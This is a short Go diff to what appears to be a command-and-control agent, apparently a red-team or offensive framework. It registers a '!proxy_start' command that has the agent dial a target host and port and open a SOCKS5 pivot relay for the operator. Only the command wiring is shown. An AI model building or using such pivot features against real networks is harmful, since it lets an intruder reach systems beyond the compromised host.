@@ -119,6 +119,19 @@ func C2Commands() *cobra.Command {
 	fileDownloaderCmd.Flags().StringP("checksum", "c", "", "Checksum")
 	rootCmd.AddCommand(fileDownloaderCmd)
 
+	// !proxy_start — SOCKS5 pivot relay (C2-side SOCKS5 listener asks this agent
+	// to dial a target and open a dedicated Proxy-route stream).
+	proxyStartCmd := &cobra.Command{
+		Use:     def.C2CmdProxyStart,
+		Short:   "Dial a target and open a C2 proxy relay stream (SOCKS5 pivot)",
+		Example: "!proxy_start --token <token> --target <host:port>",
+		GroupID: "generic",
+		Run:     proxyStartCmdRun,
+	}
+	proxyStartCmd.Flags().StringP("token", "", "", "Relay token (ties the stream to the operator's SOCKS5 connection)")
+	proxyStartCmd.Flags().StringP("target", "", "", "Target to dial, host:port")
+	rootCmd.AddCommand(proxyStartCmd)
+
 	platformCommands(rootCmd)
 
 	return rootCmd
